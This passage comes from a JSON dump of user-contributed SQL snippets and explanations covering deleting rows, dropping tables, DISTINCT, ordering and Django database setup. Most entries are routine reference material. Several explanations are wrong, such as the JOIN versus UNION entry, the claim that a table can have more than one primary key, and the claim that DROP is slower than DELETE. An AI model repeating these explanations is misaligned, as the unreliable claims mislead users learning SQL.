Test')); assert(count == 2);  // Delete a record count = await database     .rawDelete('DELETE FROM Test WHERE name = ?', ['another name']); assert(count == 1);  // Close the database await database.close(); \n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 841,
    "keyword": null,
    "link": null,
    "title": " delete record mysql",
    "description": "DELETE FROM products WHERE product_id=1;\nDELETE FROM table_name WHERE some_column = some_value \nDELETE FROM table_name [WHERE Clause]\nDELETE FROM table_name WHERE condition; In this statement: First, specify the table from which you delete data. Second, use a condition to specify which rows to delete in the WHERE clause.  for example: DELETE FROM customers WHERE id = 1;\nDELETE FROM table_name WHERE condition;\nDELETE FROM table_name [WHERE Clause] \t1. If the WHERE clause is not specified, then all the records will be deleted from the given MySQL table. \t2. You can specify any condition using the WHERE clause. \t3. You can delete records in a single table at a time. The WHERE clause is very useful when you want to delete selected rows in a table.  ref: https://www.tutorialspoint.com/mysql/mysql-delete-query.htm\n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 842,
    "keyword": null,
    "link": null,
    "title": " delete record mysql query",
    "description": "DELETE FROM table_name WHERE condition; In this statement: First, specify the table from which you delete data. Second, use a condition to specify which rows to delete in the WHERE clause.  for example: DELETE FROM customers WHERE id = 1;\n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 843,
    "keyword": null,
    "link": null,
    "title": " delete row by id mysql",
    "description": "DELETE FROM products WHERE product_id=1;\nDELETE FROM `table_name` [WHERE condition];\nDELETE FROM table_name WHERE condition;\n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 844,
    "keyword": null,
    "link": null,
    "title": " delete row mssql",
    "description": "DELETE FROM table_name WHERE condition;  -- Note: Be careful when deleting records in  -- a table! Notice the WHERE clause in the DELETE  -- statement. The WHERE clause specifies which record(s)  -- should be deleted. If you omit the WHERE clause, all records  -- in the table will be deleted!\n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 845,
    "keyword": null,
    "link": null,
    "title": " delete row mysql",
    "description": "DELETE FROM products WHERE product_id=1;\nDELETE FROM table_name WHERE some_column = some_value \nDELETE FROM table WHERE condition;\nDELETE FROM table_name [WHERE Clause]\nTRUNCATE tablename\n                                     DELETE FROM table_name WHERE condition;Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 846,
    "keyword": null,
    "link": null,
    "title": " delete row psql",
    "description": "DELETE FROM table WHERE condition;\nDELETE FROM tablename;\nDELETE FROM table WHERE condition;\nDELETE FROM table USING another_table WHERE table.id = another_table.id;\npublic function deletedata(){\t  \t$this->db->where('id', 2);\t \t$this->db->delete('table_name');  \t}\n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 847,
    "keyword": null,
    "link": null,
    "title": " delete rows in sql with condition",
    "description": "DELETE FROM table_name WHERE condition;  // E.g. DELETE FROM Customer WHERE Age > 65; DELETE FROM Customer WHERE Age > 65 AND Name = 'XYZ';\n",
    "reg_date": "2021-10-12T09:55:00.000Z"
  },
  {
    "id": 848,
    "keyword": null,
    "link": null,
    "title": " delete rows table oracle",
    "description": "DELETE FROM my_table;\t\t-- all rows, commit needed TRUNCATE TABLE my_table;\t-- all rows, no possible rollback DELETE FROM my_table WHERE my_id = 12345; DELETE FROM my_table WHERE my_id IN (SELECT id2 FROM my_table2); COMMIT;\t\t-- don't forget it...\n",
    "reg_date": "2021-10-12T09:55:00.000Z"
  },
  {
    "id": 849,
    "keyword": null,
    "link": null,
    "title": " delete specific row in sql",
    "description": "DELETE FROM Categories WHERE CategoryID=\"2\"AND CategoryID=\"3\" AND CategoryID=\"5\"; \n",
    "reg_date": "2021-10-12T09:55:00.000Z"
  },
  {
    "id": 850,
    "keyword": null,
    "link": null,
    "title": " delete stored proc sql server",
    "description": "DROP PROCEDURE <stored procedure name>;   GO   \n",
    "reg_date": "2021-10-12T09:55:00.000Z"
  },
  {
    "id": 851,
    "keyword": null,
    "link": null,
    "title": " delete table",
    "description": "DROP TABLE table_name;\nDeletes a table from a database. Example: Removes the users table. DROP TABLE users;\n",
    "reg_date": "2021-10-12T09:55:00.000Z"
  },
  {
    "id": 852,
    "keyword": null,
    "link": null,
    "title": " delete table in mysql",
    "description": "DROP TABLE table_name;\nDELETE FROM `table_name` [WHERE condition];\n-- 'DROP TABLE' followed by the name of the table you would like -- to drop. DROP TABLE `test_table`;\nDROP TABLE tablename;\ndelete table query  DROP TABLE <table name; e.g. DROP TABLE students;\nTo remove existing tables, you use the MySQL DROP TABLE statement.  Here is the basic syntax of the DROP TABLE statement:  DROP [TEMPORARY] TABLE [IF EXISTS] table_name [, table_name] ... [RESTRICT | CASCADE] The DROP TABLE statement removes a table and its data permanently from the database. In MySQL, you can also remove multiple tables using a single DROP TABLE statement, each table is separated by a comma (,).  The TEMPORARY option allows you to remove temporary tables only. It ensures that you do not accidentally remove non-temporary tables.  The IF EXISTS option conditionally drop a table only if it exists. If you drop a non-existing table with the IF EXISTS option, MySQL generates a NOTE, which can be retrieved using the SHOW WARNINGS statement.  Note that the DROP TABLE statement only drops tables. It doesn&rsquo;t remove specific user privileges associated with the tables. Therefore, if you create a table with the same name as the dropped one, MySQL will apply the existing privileges to the new table, which may pose a security risk.  The RESTRICT and CASCADE  options are reserved for the future versions of MySQL.\n",
    "reg_date": "2021-10-12T09:55:00.000Z"
  },
  {
    "id": 853,
    "keyword": null,
    "link": null,
    "title": " delete table sql",
    "description": "DROP TABLE table_name;\nTRUNCATE TABLE  table_name; \nDELETE FROM table_name WHERE condition; -- \t\t\tEx. DELETE FROM Customers WHERE CustomerName='Mustafa Mbari';\n-- Drop, but no space gain DROP TABLE table_name; -- Really frees space (Oracle) DROP TABLE table_name PURGE;\nDeletes a table from a database. Example: Removes the users table. DROP TABLE users;\nDELETE FROM `table` WHERE condition\n",
    "reg_date": "2021-10-12T09:55:00.000Z"
  },
  {
    "id": 854,
    "keyword": null,
    "link": null,
    "title": " delete user postgres",
    "description": "-- Syntax for Azure SQL Data Warehouse and Parallel Data Warehouse      DROP USER user_name   \nDROP USER [ IF EXISTS ] name [, ...]\n",
    "reg_date": "2021-10-12T09:55:00.000Z"
  },
  {
    "id": 855,
    "keyword": null,
    "link": null,
    "title": " delete user sql",
    "description": "DROP TABLE tableName CASCADE;  -- Table can also be schema or whatever else.\n-- Syntax for Azure SQL Data Warehouse and Parallel Data Warehouse      DROP USER user_name   \n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 856,
    "keyword": null,
    "link": null,
    "title": " deleting row in sql",
    "description": "delete from TableName where condition; delete from scrumteam where firstname='Jack'; delete from scrumteam where JobTitle='SDET';\n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 857,
    "keyword": null,
    "link": null,
    "title": " desc sql",
    "description": "SELECT id,       first_name,     last_name,    FROM customer   ORDER BY last_name ASC; \n//this_for_descending_order..   SELECT * FROM TableName ORDER BY columnName DESC;  // this_for_ascending_order.. SELECT * FROM TableName ORDER BY columnName ASC;\nUsed with ORDER BY to return the data in ascending order. Example: Apples, Bananas, Peaches, Raddish\n  SELECT * FROM Customers ORDER BY CustomerName DESC; \nUsed with ORDER BY to return the data in descending order. Example: Raddish, Peaches, Bananas, Apples\n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 858,
    "keyword": null,
    "link": null,
    "title": " descending order sql",
    "description": "//this_for_descending_order..   SELECT * FROM TableName ORDER BY columnName DESC;  // this_for_ascending_order.. SELECT * FROM TableName ORDER BY columnName ASC;\nSELECT q.*      FROM (SELECT TOP 3 *                FROM table                ORDER BY id DESC) q     ORDER BY q.id ASC\nSELECT * FROM employees ORDER BY employees.employee_id DESC ; &middot;        Ascending ( ASC) &middot;        Descending ( DESC)\nSQL order of execution defines the execution order of clauses.  -Select It starts execution with  -from  (Choose and join tables to get base data) after from -where ( filters base data ) -group by (Aggregates base data) -having (filters aggregated data) -select (returns final data) -order by (sorts the final data) -limit (limits the returned data to a row count)  Only select and from are mandatory\nORDER BY: is for sorting result either in descending or ascending order.\n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 859,
    "keyword": null,
    "link": null,
    "title": " describe in sqlite3",
    "description": "#describe sqlite .schema table_name\n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 860,
    "keyword": null,
    "link": null,
    "title": " describe table in sql",
    "description": "desc <table name>;\n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 861,
    "keyword": null,
    "link": null,
    "title": " describe table mysql",
    "description": "DESCRIBE table_name;\nDESCRIBE table_name; # To show table structure...\n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 862,
    "keyword": null,
    "link": null,
    "title": " describe table postgres",
    "description": "-- All information SELECT * FROM information_schema.columns WHERE table_schema = 'some_schema' AND TABLE_NAME = 'some_table';  -- Or a more simplified version  SELECT    table_name,    column_name,    data_type FROM    information_schema.columns WHERE    table_name = 'some_table'; \npostgres=# \\d schema.tablename; \n                                     SELECT     table_name,     column_name,     data_type  FROM     information_schema.columns WHERE     table_name = 'city';\n\\d table_name or \\d+ table_name or  SELECT     table_name,     column_name,     data_type  FROM     information_schema.columns WHERE     table_name = 'city';\n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 863,
    "keyword": null,
    "link": null,
    "title": " df to sql pandas sql achemy",
    "description": "resultDf.to_sql('table_name', engine, schema=\"schema_name\", if_exists=\"append\", index=False)\nfrom sqlalchemy import create_engine engine = create_engine('sqlite://', echo=False) df.to_sql('users', con=engine) engine.execute(\"SELECT * FROM users\").fetchall() \n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 864,
    "keyword": null,
    "link": null,
    "title": " difference between drop and truncate in sql",
    "description": "DELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 865,
    "keyword": null,
    "link": null,
    "title": " difference between innodb and myisam",
    "description": "MYISAM:  MYISAM supports Table-level Locking MyISAM designed for need of speed MyISAM does not support foreign keys hence we call MySQL with MYISAM is DBMS MyISAM stores its tables, data and indexes in diskspace using separate three different files. (tablename.FRM, tablename.MYD, tablename.MYI) MYISAM not supports transaction. You cannot commit and rollback with MYISAM. Once you issue a command it&rsquo;s done. MYISAM supports fulltext search You can use MyISAM, if the table is more static with lots of select and less update and delete.  INNODB:  InnoDB supports Row-level Locking InnoDB designed for maximum performance when processing high volume of data InnoDB support foreign keys hence we call MySQL with InnoDB is RDBMS InnoDB stores its tables and indexes in a tablespace InnoDB supports transaction. You can commit and rollback with InnoDB\n",
    "reg_date": "2021-10-12T09:55:01.000Z"
  },
  {
    "id": 866,
    "keyword": null,
    "link": null,
    "title": " difference between join vs union",
    "description": "JOIN combines the ROWs, we will have longer rows at the end.  We are joining the rows from two or more related tables.  UNION combines the COLUMNs, we will have longer columns at the end. UNION combine two different query. We are joining the columns from two or more related tables. Can be non related tables but queries must select same column names with same data type.\nJOIN combines the ROWs, we will have longer rows at the end.  We are joining the rows from two or more related tables.  UNION combines the COLUMNs, we will have longer columns at the end. UNION combine two different query. We are joining the columns from two or more related tables. Can be non related tables but queries must select same column names with same data type.\n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 867,
    "keyword": null,
    "link": null,
    "title": " difference between left join and left outer join in postgresql",
    "description": "-- LEFT OUTER JOIN is equivalent to LEFT JOIN -- b.VALUE1 is null when ID not in table2 (idem for c.VALUE1 in table3) SELECT a.ID, a.NAME, b.VALUE1, c.VALUE1 FROM table1 a    LEFT OUTER JOIN table2 b ON a.ID = b.ID   LEFT OUTER JOIN table3 c ON a.ID = c.ID WHERE a.ID >= 1000;  -- &dArr; Test it &dArr; (Fiddle source link)\n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 868,
    "keyword": null,
    "link": null,
    "title": " difference between nosql and sql",
    "description": "SQL\t\t\t\t\t\t|    NoSQL   relational\t\t\t| non-relational   \t\t\t\t\t\t| use structured query\t| NoSQL databases have  language and have a\t\t| dynamic schemas for  predefined schema.\t\t| unstructured data. \t\t\t\t\t\t| are vertically scalable | are horizontally scalable. are table based\t\t\t| are document, key-value, \t\t\t\t\t\t| graph or wide-column stores.                         | are better for multi-row| are better for unstructured  transactions\t\t\t| data like documents or JSON.\nA SQL Database follows a table like structure which can have an  unlimited number of rows and every data present inside the database  is properly structured with Predefined Schemas, it is basically used  to manipulate Relational Databases Management Systems.  A NoSQL Database is a Distributed Database where the data is very  unstructured with Dynamic Schema. Unlike SQL it cannot have unlimited  rows but it follows a Standard Schema Definition and can store all  sorts of data models with large distributed data in the form of  key-value pairs, graph databases, documents or wide-column stores.\n/* KEY DIFFERENCE SQL pronounced as \"S-Q-L\" or as \"See-Quel\" is primarily called RDBMS or Relational Databases whereas NoSQL is a Non-relational or Distributed Database. SQL databases are table based databases whereas NoSQL databases can be document based, key-value pairs, graph databases. SQL databases are vertically scalable while NoSQL databases are horizontally scalable. SQL databases have a predefined schema whereas NoSQL databases use dynamic schema for unstructured data. SQL requires specialized DB hardware for better performance while NoSQL uses commodity hardware.*/\n----------------- key differences | ----------------- SQL databases are usually RDBMS or DBMS (Relational DataBase Management Systems) and are table based, NoSQL uses unstructured data (like graphs)  ----------------- Examples        | ----------------- SQL Databases: MySQL SQLite Oracle DB  NoSQL: MongoDB DynamoDB\n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 869,
    "keyword": null,
    "link": null,
    "title": " difference between primary key and foreign key",
    "description": "Primary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL Foreign Key:  It is a column that comes from a different table and using Foreign key tables are related each other It is the primary key of another table It can be duplicate or null for another table  Unique Key: Only unique value and also can contain NULL\nPrimary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL Foreign Key:  It is a column that comes from a different table and using Foreign key tables are related each other It is the primary key of another table It can be duplicate or null for another table  Unique Key: Only unique value and also can contain NULL     \nPrimaryKey:-  A primary key constrain is a column or group of columns that uniquely identifies every row in the table of the relational database management system.  It cannot be a duplicate, meaning the same value should not appear more than once in the table.  Foreign key:- A table can have more than one primary key.  Primary key can be defined at the column or the table level. If you create a composite primary key, it should be defined at the table level. Foreign key is a column that creates a relationship between two tables. The purpose of the Foreign key is to maintain data integrity and allow navigation between two different instances of an entity. It acts as a cross-reference between two tables as it references the primary key of another table.  Every relationship in the database should be supported by a foreign key.\nprimary key and foreign key\n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 870,
    "keyword": null,
    "link": null,
    "title": " difference between relational and non relational database",
    "description": "Relational Database = -Tables are structured related to each other -Each specific type of domain data is strored  it's own table  Non-Relational Database = -There is no relation at all between tables -Mostly key+value pair : like jSon\n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 871,
    "keyword": null,
    "link": null,
    "title": " difference between sql and mysql",
    "description": "SQL is the language. It outlines syntax that allows you to write queries that manage relational databases. Nothing more. MySQL meanwhile is a database system that runs on a server. It implements the SQL language, allowing you to write queries using its syntax to manage MySQL databases.\nMySQL is a relational database vendor which uses SQL language on the other hand SQL is a query language which deals with database.\n&bull; SQL is a standard language for  retrieving and manipulating structured databases. On the contrary,  MySQL is a relational database management system, like SQL Server, Oracle or IBM DB2, that is used to manage SQL databases. \n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 872,
    "keyword": null,
    "link": null,
    "title": " difference between unique and distinct",
    "description": "Unique: helps to ensure that all the values in a column are different Distinct: helps to remove all the duplicate records when retrieving the records from a table.\n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 873,
    "keyword": null,
    "link": null,
    "title": " difference between where and having clause",
    "description": "The difference between the having and where clause in SQL is that the where clause cannot be used with aggregates(max, min,count,avg,sum) , but the having clause can.\nThe difference between the having and where clause in SQL is that the where  clause cannot be used with aggregates, but the having clause can.\n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 874,
    "keyword": null,
    "link": null,
    "title": " difference in dates sql",
    "description": "DECLARE      @start_dt DATETIME2= '2019-12-31 23:59:59.9999999',      @end_dt DATETIME2= '2020-01-01 00:00:00.0000000';  SELECT      DATEDIFF(year, @start_dt, @end_dt) diff_in_year,      DATEDIFF(quarter, @start_dt, @end_dt) diff_in_quarter,      DATEDIFF(month, @start_dt, @end_dt) diff_in_month,      DATEDIFF(dayofyear, @start_dt, @end_dt) diff_in_dayofyear,      DATEDIFF(day, @start_dt, @end_dt) diff_in_day,      DATEDIFF(week, @start_dt, @end_dt) diff_in_week,      DATEDIFF(hour, @start_dt, @end_dt) diff_in_hour,      DATEDIFF(minute, @start_dt, @end_dt) diff_in_minute,      DATEDIFF(second, @start_dt, @end_dt) diff_in_second,      DATEDIFF(millisecond, @start_dt, @end_dt) diff_in_millisecond;\nSELECT t1.OrderNo,DATEDIFF(day,t1.LoadedStartDate,t2.LoadedStartDate) FROM UnnamedTableFromQuestion t1        INNER JOIN      UnnamedTableFromQuestion t2        on          t1.OrderNo = t2.OrderNo WHERE t1.OpNo = 1 and       t2.OpNo = 4        ////////////////////////////////////////////////////////////////  select cur.unique_id_field, cur.seq_no, cur.date_created ,    datediff(second, prv.date_created, cur.date_created) as diff_in_seconds  from yourtable as cur    join yourtable as prv      on cur.seq_no = prv.seq_no + 1;\nSELECT (END_DATE - START_DATE) Days-Total FROM MyTable /*this works for oracle sql*/\n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 875,
    "keyword": null,
    "link": null,
    "title": " difference primary key and foreign key",
    "description": "Primary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL Foreign Key:  It is a column that comes from a different table and using Foreign key tables are related each other It is the primary key of another table It can be duplicate or null for another table  Unique Key: Only unique value and also can contain NULL\nPrimary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL Foreign Key:  It is a column that comes from a different table and using Foreign key tables are related each other It is the primary key of another table It can be duplicate or null for another table  Unique Key: Only unique value and also can contain NULL     \nprimary key and foreign key\n",
    "reg_date": "2021-10-12T09:55:02.000Z"
  },
  {
    "id": 876,
    "keyword": null,
    "link": null,
    "title": " difference sql and mysql",
    "description": "SQL is the language. It outlines syntax that allows you to write queries that manage relational databases. Nothing more. MySQL meanwhile is a database system that runs on a server. It implements the SQL language, allowing you to write queries using its syntax to manage MySQL databases.\nMySQL is a relational database vendor which uses SQL language on the other hand SQL is a query language which deals with database.\n&bull; SQL is a standard language for  retrieving and manipulating structured databases. On the contrary,  MySQL is a relational database management system, like SQL Server, Oracle or IBM DB2, that is used to manage SQL databases. \n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 877,
    "keyword": null,
    "link": null,
    "title": " digitalocean ubuntu install mysql",
    "description": "sudo apt update sudo apt install mysql-server sudo mysql_secure_installation \n//follow this blog  https://www.digitalocean.com/community/tutorials/how-to-install-mysql-on-ubuntu-18-04\nmysql installation\n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 878,
    "keyword": null,
    "link": null,
    "title": " disableforiegn key check",
    "description": "SET FOREIGN_KEY_CHECKS=0;\n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 879,
    "keyword": null,
    "link": null,
    "title": " disallowed function mysql to date()",
    "description": "mysql> Select STR_TO_DATE('22.10.2017',GET_FORMAT(DATE,'EUR'))AS 'EUROPEAN FORMAT'; +-----------------+ | EUROPEAN FORMAT | +-----------------+ | 2017-10-22      | +-----------------+ 1 row in set (0.00 sec)\nmysql> SELECT STR_TO_DATE('18,05,2009','%d,%m,%Y'); +--------------------------------------+ | STR_TO_DATE('18,05,2009','%d,%m,%Y') | +--------------------------------------+ | 2009-05-18                           |  +--------------------------------------+ 1 row in set (0.00 sec) \nSELECT STR_TO_DATE('18,05,2009','%d,%m,%Y');  \n                                     SELECT STR_TO_DATE('21,5,2013','%d,%m,%Y');\nmysql> Select * from date_testing1; +-------+------------+ | Name | Date        | +-------+------------+ | Ram   | 2017-05-03 | | Shyam | 2003-10-31 | +-------+------------+ 2 rows in set (0.07 sec)  mysql> Select Name, Date, DATE_FORMAT(date,GET_FORMAT(date,'USA'))AS 'DATE IN US FORMAT'from date_testing1 Where Name='Ram'; +------+------------+-------------------+ | Name | Date       | DATE IN US FORMAT | +------+------------+-------------------+ | Ram | 2017-05-03  | 05.03.2017        | +------+------------+-------------------+ 1 row in set (0.00 sec)\n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 880,
    "keyword": null,
    "link": null,
    "title": " display all databases",
    "description": "SHOW DATABASES;\nSELECT * FROM SYS.DATABASES\n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 881,
    "keyword": null,
    "link": null,
    "title": " display all node label neo4j",
    "description": "MATCH (n) RETURN distinct labels(n)\n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 882,
    "keyword": null,
    "link": null,
    "title": " display table in sql",
    "description": "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG='YOUR_Database_name'\nShowing all table:  show tables;  Showing table data: SELECT * or column_names FROM table_name;\nSELECT  'test1' AS [@class]     , ( SELECT  'test2' as [@class]         , (SELECT 'Name' FOR XML PATH(''))         FOR XML PATH('td'), type)     ,(SELECT  'test3' as [@class]         , (SELECT 'Value' FOR XML PATH(''))         FOR XML PATH('td'), type)  FOR XML PATH('tr'), type\nSELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE' AND TABLE_CATALOG=db_name()  and TABLE_NAME like'%table_name%'--to check particular table\nSELECT * FROM TABLE_NAME;\nSELECT columname FROM tablename\n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 883,
    "keyword": null,
    "link": null,
    "title": " display total number of tables in mysql",
    "description": "SELECT count(*) AS TOTALNUMBEROFTABLES    -> FROM INFORMATION_SCHEMA.TABLES    -> WHERE TABLE_SCHEMA = 'SCHEMA_HERE';\n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 884,
    "keyword": null,
    "link": null,
    "title": " display users in mysql",
    "description": "select * from mysql.user; #or for less data select user, host from mysql.user;\n//To show all data use following query select * from mysql.user; // To show user and host use following query select User,Host from mysql.user;\n#display all user data select * from mysql.user; #display username and host select user, host from mysql.user;\n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 885,
    "keyword": null,
    "link": null,
    "title": " distance calculator from lat long sql query",
    "description": "COALESCE(   \t(        6371 * acos( cos( radians({$latitude}) ) * cos( radians( `latitude` ) ) * cos( radians( `longitude` ) - radians({$longitude}) ) + sin( radians({$latitude}) ) * sin( radians( `latitude` ) ) )      )   , 0) AS distance\n",
    "reg_date": "2021-10-12T09:55:03.000Z"
  },
  {
    "id": 886,
    "keyword": null,
    "link": null,
    "title": " distincct sql",
    "description": "SELECT DISTINCT column1, column2, ...   FROM table_name; \n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 887,
    "keyword": null,
    "link": null,
    "title": " distinct in sql",
    "description": "SELECT DISTINCT column1, column2, ...   FROM table_name; \nWhen querying data from a table, you may get duplicate rows. In order to remove these duplicate rows, you use the DISTINCT clause in the SELECT statement.  Here is the syntax of the DISTINCT clause:  SELECT DISTINCT     select_list FROM     table_name;\nSELECT DISTINCT ma_colonne FROM nom_du_tableau\nSELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nDistinct: helps to displays the non duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\nSELECT DISTINCT FIRST_NAME FROM VISITORS;\n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 888,
    "keyword": null,
    "link": null,
    "title": " distinct in sql server",
    "description": "SELECT DISTINCT column1, column2, ...   FROM table_name; \nSELECT DISTINCT ma_colonne FROM nom_du_tableau\nSELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nDistinct: helps to displays the non duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\nSELECT DISTINCT FIRST_NAME FROM VISITORS;\nThe SELECT DISTINCT statement is used to return only distinct (different) values. Ex: select DISTINCT Country from TableName;\n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 889,
    "keyword": null,
    "link": null,
    "title": " distinct keyword sql",
    "description": "SELECT DISTINCT column1, column2, ...   FROM table_name; \nWhen querying data from a table, you may get duplicate rows. In order to remove these duplicate rows, you use the DISTINCT clause in the SELECT statement.  Here is the syntax of the DISTINCT clause:  SELECT DISTINCT     select_list FROM     table_name;\nSELECT DISTINCT column1, column1, ..... FROM TABLE /*DISTINCT WILL NOT SELECT THE SAME VALUES IN SAME COLUMN*/\nDistinct: helps to displays the non duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 890,
    "keyword": null,
    "link": null,
    "title": " division by zero postgres",
    "description": "-- avoid division error in Postgres value/NULLIF(col, 0)  -- if col == 0, NULL will be returned value/COALESCE(NULLIF(col, 0), 1)  -- if col == 0, value will be returned \nSELECT 1.0 / NULLIF(column_that_may_be_zero, 0)\n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 891,
    "keyword": null,
    "link": null,
    "title": " django.core.exceptions.ImproperlyConfigured: mysqlclient 1.4.0 or newer is required; you have 0.10.1.",
    "description": " #here is latest version of pymysql in mysqldb.  #add this settings in settings file  import pymysql  pymysql.version_info = (1, 4, 6, 'final', 0)  pymysql.install_as_MySQLdb() \nimport pymysql pymysql.version_info = (1, 3, 13, \"final\", 0) pymysql.install_as_MySQLdb()\n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 892,
    "keyword": null,
    "link": null,
    "title": " django.db.utils.OperationalError: (1698, \"Access denied for user 'root'@'localhost'\")",
    "description": "create user 'django'@'localhost' identified by 'django-user-password'; grant usage on *.* to 'django'@'localhost'; grant all privileges on django-database-1.* to 'django'@'localhost';\ncreate user 'django'@'localhost' identified by 'django-user-password'; grant usage on *.* to 'django'@'localhost'; grant all privileges on django-database-1.* to 'django'@'localhost'; \n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 893,
    "keyword": null,
    "link": null,
    "title": " django.db.utils.OperationalError: no such table:",
    "description": "python manage.py makemigrations python manage.py migrate\nfind . -path \"*/migrations/*.py\" -not -name \"__init__.py\" -delete  find . -path \"*/migrations/*.pyc\"  -delete\nrm db.sqlite3\n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 894,
    "keyword": null,
    "link": null,
    "title": " django count sql queries",
    "description": ">>> from django.conf import settings >>> settings.DEBUG = True >>> from django.db import connection >>> Model.objects.count() >>> # python 3 uses print() >>> print(len(connection.queries)) 1 \n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 895,
    "keyword": null,
    "link": null,
    "title": " django mssql backend",
    "description": "pip install django-mssql-backend\n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 896,
    "keyword": null,
    "link": null,
    "title": " django mysql settings",
    "description": "#add this settings in settings file  DATABASES = {     'default': {         'ENGINE': 'django.db.backends.mysql',          'NAME': 'DB_NAME',         'USER': 'DB_USER',         'PASSWORD': 'DB_PASSWORD',         'HOST': 'localhost',   # Or an IP Address that your DB is hosted on         'PORT': '3306',     } } \n",
    "reg_date": "2021-10-12T09:55:04.000Z"
  },
  {
    "id": 897,
    "keyword": null,
    "link": null,
    "title": " django sqlite database",
    "description": "DATABASES = {     'default': {         'ENGINE': 'django.db.backends.sqlite3',         'NAME': 'mydatabase',     } }\npython manage.py migrate\nsudo apt install python3-dev libmysqlclient-dev default-libmysqlclient-dev \n # --------------- Start with databases in Django ------------------ #  In your virtual environment, where your Django project lives,  use the following commands:      # Migrations are Django&rsquo;s way of propagating changes you make to    # your models (adding a field, deleting a model, etc.) into your    # database schema.    >> python3 manage.py makemigrations            # If used for the first time, it creates a standard user model    # (a table for saving information about users). Otherwise, it updates    # the database with the new information in the folder \"migrations\"    # (responsible for applying and unapplying migrations):    >> python3 manage.py migrate              # For printing the SQL code that is going to run:   >> python3 manage.py sqlmigrate \"name_app\" \"code_of_specific_object\"     # for example: python3 manage.py sqlmigrate app 0001         # Run a Django + python shell for working/testing with models:   >> python3 manage.py shell                                             \n",
    "reg_date": "2021-10-12T09:55:05.000Z"
  },
  {
    "id": 898,
    "keyword": null,
    "link": null,
    "title": " dml vs ddl sql",
    "description": "DML commands actions can be stored DLL command actions can't be stored.  DML = SELECT, INSERT, UPDATE, DELETE, MERGE DDL = CREATE, ALTER, TRUNCATE, DROP TABLE, RENAME\n",
